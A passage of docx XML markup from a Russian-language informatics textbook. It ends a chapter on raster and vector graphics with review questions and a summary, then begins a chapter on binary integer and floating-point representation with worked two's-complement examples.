        <w:t>**В чём принципиальная разница между растровой и векторной графикой?** Приведите по два примера применения каждого типа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Рассчитайте объём несжатого изображения:** Разрешение 2560×1440 пикселей, глубина цвета 32 бита (RGB + альфа). Выразите ответ в мегабайтах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объясните цветовую модель RGB:** Как получается белый цвет? Как получается жёлтый цвет? Почему эта модель называется аддитивной?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**В чём разница между форматами PNG и JPEG?** Когда следует использовать каждый из них? Какой из них использует сжатие с потерями?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Почему векторные изображения сохраняют качество при масштабировании, а растровые нет?** Что происходит при увеличении растрового изображения?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Что такое альфа-канал?** Сколько дополнительных бит на пиксель он добавляет в типичном случае? Приведите пример использования прозрачности в графике.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на расчёт:** Фотография 4096×2160 пикселей (4K) сохранена в JPEG и занимает 3 МБ. Рассчитайте коэффициент сжатия по сравнению с несжатым форматом (24 бита).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Резюме главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы изучили:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Два подхода к представлению графики:** растровый (сетка пикселей) и векторный (математические объекты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Цветовые модели:** RGB (для экранов), CMYK (для печати), HSV (для интуитивного выбора цвета), Grayscale (оттенки серого)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Глубину цвета:** от 1 бита (чёрно-белое) до 48 бит (Deep Color), понятие True Color (24 бита)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Расчёт объёма изображения:** формула V = (W × H × D) / 8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Форматы графических файлов:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Растровые: BMP, PNG, JPEG, GIF, WebP, TIFF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Векторные: SVG, AI, EPS, PDF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Методы сжатия:** сжатие без потерь (PNG, GIF) и с потерями (JPEG)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>✅ **Практическое применение:** выбор форматов для веб-разработки, полиграфии, дизайна</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь вы должны уметь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Различать растровую и векторную графику, понимать области их применения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рассчитывать объём растрового изображения по его параметрам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объяснять принципы работы цветовых моделей RGB и CMYK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбирать оптимальный формат изображения для конкретной задачи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оценивать эффективность сжатия графических данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти знания понадобятся в главе 1.12 при изучении алгоритмов сжатия информации, а также в разделе 8 при рассмотрении передачи мультимедийных данных по сетям.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Конец главы_</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Метаинформация (не включается в финальный учебник)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Объём</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ~16 500 символов  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время на изучение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 40-50 минут  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Средняя  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предварительные требования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Главы 1.1, 1.2, 1.5  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статус</w:t>
      </w:r>
      <w:r>
        <w:t>: ✅ Готова (14 января 2026)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.9: Представление числовых данных в двоичном коде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Числа — основа всех вычислений, выполняемых компьютером. От простых арифметических операций до сложных научных расчётов, от графики до искусственного интеллекта — везде используются числовые данные. Понимание того, как компьютер представляет и обрабатывает числа в двоичном коде, является фундаментальным для любого специалиста в области информатики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Данная тема тесно связана с главой 1.1, где мы изучали арифметику в двоичной системе счисления, и главой 1.2, где рассматривали представление данных в памяти ЭВМ. Знания из этой главы понадобятся при изучении главы 1.11 (системы счисления), раздела 2 (архитектура ЭВМ) и раздела 6 (языки программирования).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы рассмотрим, как компьютер представляет целые числа (беззнаковые и знаковые) и вещественные числа (числа с плавающей точкой), изучим стандарт IEEE 754, разберём проблемы точности вычислений и познакомимся с практическими аспектами работы с числами в программировании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Представление целых чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Беззнаковые целые числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Беззнаковые целые числа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (unsigned integers) — это неотрицательные целые числа, представленные в двоичной системе счисления без знака.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При представлении беззнакового целого числа в n битах можно закодировать числа в диапазоне от 0 до (2ⁿ − 1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**8 бит** (1 байт): диапазон от 0 до 255 (2⁸ − 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**16 бит** (2 байта): диапазон от 0 до 65 535 (2¹⁶ − 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**32 бит** (4 байта): диапазон от 0 до 4 294 967 295 (2³² − 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**64 бит** (8 байт): диапазон от 0 до 18 446 744 073 709 551 615 (2⁶⁴ − 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преобразование десятичного числа в двоичный беззнаковый код:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Используется метод последовательного деления на 2 (будет подробно рассмотрен в главе 1.11).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Представим число 75 в 8-битном беззнаковом формате.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>75₁₀ = 64 + 8 + 2 + 1 = 2⁶ + 2³ + 2¹ + 2⁰</w:t>
        <w:br/>
        <w:br/>
        <w:t>В двоичной системе:</w:t>
        <w:br/>
        <w:t>75₁₀ = 01001011₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Проверка: 0×128 + 1×64 + 0×32 + 0×16 + 1×8 + 0×4 + 1×2 + 1×1 = 75</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Знаковые целые числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Знаковые целые числа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (signed integers) могут быть положительными, отрицательными или нулём. Для их представления необходимо закодировать знак числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Существует три основных способа представления знаковых чисел:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Прямой код (Sign-Magnitude)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прямом коде</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> старший бит отводится под знак (0 — положительное, 1 — отрицательное), остальные биты хранят модуль числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки прямого кода:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Два представления нуля: +0 (00000000) и −0 (10000000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Усложнённая арифметика (требуется различная логика для положительных и отрицательных чисел)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Практически не используется в современных компьютерах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (8 бит):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+75₁₀ = 01001011₂  (знак = 0, модуль = 1001011)</w:t>
        <w:br/>
        <w:t>−75₁₀ = 11001011₂  (знак = 1, модуль = 1001011)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Обратный код (One's Complement)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обратном коде</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> положительные числа представляются как в прямом коде, а отрицательные получаются инверсией всех битов положительного числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки обратного кода:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Два представления нуля: +0 (00000000) и −0 (11111111)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При сложении требуется циклический перенос</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется редко (в некоторых старых системах)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (8 бит):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+75₁₀ = 01001011₂</w:t>
        <w:br/>
        <w:t>−75₁₀ = 10110100₂  (инверсия всех битов 01001011)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">Проверка инверсии: </w:t>
        <w:br/>
        <w:t>01001011 → инверсия → 10110100</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Дополнительный код (Two's Complement) — основной метод</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дополнительный код</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> является стандартом де-факто для представления знаковых чисел во всех современных компьютерах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила получения дополнительного кода:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Положительные числа и ноль**: представляются обычным двоичным кодом со старшим битом 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отрицательные числа**: получаются двумя способами:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Способ А**: инвертировать все биты положительного числа и прибавить 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Способ Б**: переписать биты справа налево до первой единицы включительно, остальные инвертировать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества дополнительного кода:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Единственное представление нуля (00000000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Простая арифметика: сложение и вычитание выполняются одинаково для положительных и отрицательных чисел</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Старший бит указывает знак (0 = положительное, 1 = отрицательное)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Естественное расширение разрядности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Диапазон для n-битного знакового числа в дополнительном коде:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>От −2ⁿ⁻¹ до (2ⁿ⁻¹ − 1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры диапазонов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**8 бит**: от −128 до +127</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**16 бит**: от −32 768 до +32 767</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**32 бит**: от −2 147 483 648 до +2 147 483 647</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**64 бит**: от −9 223 372 036 854 775 808 до +9 223 372 036 854 775 807</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример получения дополнительного кода (8 бит):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представим число −75₁₀.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Способ А (инверсия + 1):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: Представим +75 в двоичном коде:</w:t>
        <w:br/>
        <w:t>+75₁₀ = 01001011₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 2: Инвертируем все биты:</w:t>
        <w:br/>
        <w:t>01001011 → 10110100</w:t>
        <w:br/>
        <w:br/>
        <w:t>Шаг 3: Прибавляем 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">  10110100</w:t>
        <w:br/>
        <w:t>+        1</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  10110101</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: −75₁₀ = 10110101₂ (в дополнительном коде)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сложим +75 и −75, должен получиться 0:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  01001011  (+75)</w:t>
        <w:br/>
        <w:t>+ 10110101  (−75)</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t>1 00000000</w:t>
        <w:br/>
        <w:br/>
        <w:t>Перенос за пределы 8 бит отбрасывается → 00000000 = 0 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Способ Б (переписывание и инверсия):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>+75₁₀ = 01001011₂</w:t>
        <w:br/>
        <w:br/>
        <w:t>Переписываем справа налево до первой 1 включительно: ...011</w:t>
        <w:br/>
        <w:t>Инвертируем остальные: 01001 → 10110</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 10110101₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Переполнение (Overflow)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Переполнение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> возникает, когда результат операции выходит за пределы допустимого диапазона представления.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример переполнения при сложении (8 бит, знаковые):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  01111111  (+127, максимум для 8 бит)</w:t>
        <w:br/>
        <w:t>+        1  (+1)</w:t>
        <w:br/>
        <w:t>----------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  10000000  (−128 в дополнительном коде!)</w:t>
        <w:br/>
        <w:br/>
        <w:t>Результат: 127 + 1 = −128 (переполнение!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В программировании переполнение может привести к серьёзным ошибкам, поэтому важно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выбирать достаточную разрядность для данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверять результаты операций на переполнение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Использовать типы данных с бо́льшей разрядностью при необходимости</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Представление вещественных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вещественные числа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (floating-point numbers) — это числа с дробной частью, например: 3.14, −0.001, 2.5×10⁸.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для представления вещественных чисел используется формат с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>плавающей точкой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (floating point), стандартизированный в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IEEE 754</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формат IEEE 754</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Стандарт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IEEE 754</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> определяет два основных формата:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Single precision (одинарная точность, float)** — 32 бита</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Double precision (двойная точность, double)** — 64 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общая структура числа с плавающей точкой:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(-1)^S × M × 2^E</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**S** (Sign) — знак (1 бит): 0 = положительное, 1 = отрицательное</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**E** (Exponent) — экспонента (смещённый порядок)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**M** (Mantissa/Significand) — мантисса (значащие цифры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Float (32 бита)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура 32-битного числа с плавающей точкой:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| S (1 бит) | E (8 бит) | M (23 бита) |</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Знак        Экспонента  Мантисса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
